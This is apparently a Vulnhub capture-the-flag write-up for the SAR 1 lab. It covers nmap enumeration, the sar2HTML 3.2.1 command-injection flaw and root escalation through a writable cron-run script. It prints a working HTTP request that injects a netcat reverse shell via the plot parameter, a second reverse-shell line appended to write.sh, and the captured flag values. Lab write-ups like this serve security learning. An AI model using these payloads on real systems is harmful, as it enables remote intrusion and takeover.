---
title: SAR 1
category: Vulnhub
---

## Enumeration

- Using NMAP, found http application listening on 80/tcp

```plaintext
# Nmap 7.80 scan initiated Sun Sep  6 20:28:40 2020 as: nmap -sC -sV -oA quick 192.168.112.35
Nmap scan report for 192.168.112.35
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  6 20:29:16 2020 -- 1 IP address (1 host up) scanned in 35.65 seconds

```

- After running nikto, found one entry on **robots.txt** mentioning **sar2HTML**

```plaintext
sar2HTML
```

## User Flag

- Checking the app on searchsploit found a RCE vulnerability for version 3.2.1, which is the same version currently running in this box, where would be possible get RCE from plot parameter

```plaintext
└─$ searchsploit sar2html
----------------------------------------------------------------------------------- ---------------------------
  Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------
Sar2HTML 3.2.1 - Remote Command Execution                                          | php/webapps/47204.txt
----------------------------------------------------------------------------------- ---------------------------
Shellcodes: No Results
```

- Successfully obtained a reverse shell using the following request

```http
GET /sar2HTML/index.php?plot=;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.49.112+4443+>/tmp/f HTTP/1.1
Host: 192.168.112.35
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=qp8ntm774js13nahouoon1kvdu
Upgrade-Insecure-Requests: 1
```

- Enumerating readable files     under /home, found the list below, where the user flag was found:

```plaintext
www-data@sar:/var/www$ find /home -type f -readable 2> /dev/null
/home/local.txt
/home/love/.sudo_as_admin_successful
/home/love/.bashrc
/home/love/.selected_editor
/home/love/.bash_logout
/home/love/.profile
/home/love/Desktop/user.txt
www-data@sar:/var/www$ cat /home/local.txt
0462238a22547746e340454e9cdc041a
```

Root Flag:

- After running LinEnum.sh     identified that there was a cron running as root every 5 minutes, calling     a file ./finally under html folder, which invoke a ./write.sh file at the     same directory.
- Besides not having access on     this file it calls ./write.sh, which is writable.
- Appended the command line     below to write.sh to start a reverse shell to box as root
  - rm /tmp/g;mkfifo /tmp/g;cat      /tmp/g|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/g
- After getting the shell, was     able to retrieve root flag under /root/root.txt containing the value:

```plaintext
# ls -la
total 40
drwx------  5 root root 4096 Sep  8 05:11 .
drwxr-xr-x 24 root root 4096 Mar 10 11:41 ..
-rw-------  1 root root    0 Jul 24 20:39 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jul 14 22:02 .cache
drwx------  3 root root 4096 Oct 20  2019 .gnupg
drwxr-xr-x  3 root root 4096 Oct 20  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep  8 05:12 proof.txt
-rw-r--r--  1 root root   32 Jul 14 17:41 root.txt
-rw-r-----  1 root root    5 Sep  8 05:25 .vboxclient-display-svga.pid
# cat root.txt
Your flag is in another file...
# cat proof.txt
6fe4f0598f601e515664cec37fa579b8
# 
```
